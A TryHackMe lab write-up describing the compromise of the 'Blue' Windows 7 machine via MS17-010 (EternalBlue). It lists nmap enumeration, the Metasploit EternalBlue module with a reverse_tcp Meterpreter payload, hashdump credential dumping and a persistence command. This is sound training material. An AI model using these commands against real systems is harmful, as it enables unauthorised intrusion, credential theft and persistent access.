# TryHackMe: Blue — Advanced Writeup

This is an advanced writeup for the **Blue** room on TryHackMe.  
The machine is a Windows 7 target vulnerable to **MS17-010 (EternalBlue)**.  
This writeup covers structured enumeration, vulnerability verification, exploitation using Metasploit, post-exploitation, and flag retrieval.

---

## 1. Target Information

- **Room:** Blue
- **Difficulty:** Easy
- **Category:** Windows / SMB Exploitation
- **Primary Vulnerability:** MS17-010 (EternalBlue)
- **Attack Vector:** SMB (TCP 445)
- **Tools Used:**
  - Nmap
  - Nmap NSE scripts
  - Metasploit Framework
  - Meterpreter

---

## 2. Initial Enumeration

I performed a full port scan with service detection:

```bash
nmap -sC -sV -p- <TARGET-IP>
Significant Findings

Port 445/tcp (SMB) — Open

Host appears to be Windows 7

SMB reveals possible MS17-010 vulnerability

To confirm EternalBlue:

nmap --script smb-vuln-ms17-010 -p445 <TARGET-IP>


Output confirmed:

Host is vulnerable to ms17-010.

This validated that the system is exploitable via EternalBlue.

3. Vulnerability Analysis

MS17-010 (EternalBlue) exploits a flaw in Microsoft’s handling of SMBv1 packets.
It allows:

Remote code execution

Kernel-level access

Full system compromise

This vulnerability is exploited through crafted SMB packets that trigger memory corruption in the kernel.

4. Exploitation Using Metasploit

I launched the EternalBlue exploit module:

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET-IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

Result

Exploit executed successfully

A stable Meterpreter session was opened

The session had NT AUTHORITY\SYSTEM privileges

5. Post-Exploitation

With system-level access, I enumerated the file system:

cd C:\
dir


Common directories for the flags:

System root (C:)

Windows password-related directories

User profile folders

Flags Retrieved

Flag 1 — Found at system root

Flag 2 — Found in Windows credential/password-related paths

Flag 3 — Found in the user’s home profile directory

(Flag contents are not included as per TryHackMe policy.)

6. Additional Post-Exploitation Notes
User Enumeration
net users

Hash Dump (demonstration only)
hashdump

Persistence (not executed, only referenced)

Metasploit options:

exploit/windows/local/persistence

run persistence -U -X

Privilege Check
getuid


Returned:

NT AUTHORITY\SYSTEM

7. Key Takeaways

EternalBlue is still one of the most impactful SMB vulnerabilities.

Proper enumeration helps validate exploitability before firing an exploit.

The Metasploit EternalBlue module remains reliable for Windows 7 targets.

Meterpreter provides full post-exploitation capabilities including:

Privilege enumeration

File system access

Credential harvesting

8. Conclusion

The Blue room provides a practical introduction to exploiting MS17-010.
Through structured enumeration, vulnerability verification, exploitation, and post-exploitation, the machine was fully compromised and all flags were retrieved.

This room reinforces core skills in:

SMB enumeration

Vulnerability validation

Metasploit exploitation

Windows post-exploitation techniques
```
